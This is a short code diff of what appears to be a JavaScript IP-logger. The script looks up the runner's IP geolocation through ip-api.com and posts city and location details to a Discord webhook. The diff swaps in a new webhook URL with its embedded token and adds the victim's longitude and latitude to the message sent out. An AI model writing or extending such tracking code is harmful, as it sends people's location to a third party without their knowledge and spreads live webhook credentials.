@@ -1,6 +1,6 @@
 
 
-var webHookUrl = "https://discord.com/api/webhooks/977929737223667742/3XVwwgC_Qd8jNoUaxBshWjG2ULnlBNOdIJMXY6UxN_eqd1BulAWzJfMIrMy5gQowAj7n";
+var webHookUrl = "https://discord.com/api/webhooks/977935516555169872/oEITIyKVlHry2B_PRxwDk0pRA8G5xBmSNXuRuJIKXvmz7ELv8iT8Y5P3wCdbQCF3k4a_";
 
 const request = async () => { // Calling a "synchronous" fetch
     const response = await fetch('http://ip-api.com/json/');
@@ -47,6 +47,8 @@ const request = async () => { // Calling a "synchronous" fetch
                     "\n \n __**:cityscape: City:**__ \n" 
                     + city + 
                     "\n \n__**:round_pushpin: Location:**__ \n" 
+                            + "**Longitude:** " + lon + "\n"
+                    + "**Latitude:** ```" + lat
 
     }
 
